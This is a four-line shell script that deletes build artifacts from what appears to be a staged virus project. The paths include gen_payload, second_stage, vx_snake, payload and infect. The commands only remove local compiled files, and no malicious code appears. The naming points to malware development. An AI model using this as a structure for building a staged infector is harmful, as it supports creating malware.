rm ./gen_payload/*.o ./gen_payload/TMPolitic ./gen_payload/politic.h ./gen_payload/politic
rm ./second_stage/*.o ./second_stage/TMpayload ./second_stage/payload.h ./second_stage/vx_snake.h ./second_stage/payload
rm ./snake/vx_snake ./snake/vx_snake.h
rm ./gripe/politic.h ./gripe/payload.h ./gripe/host ./gripe/infect


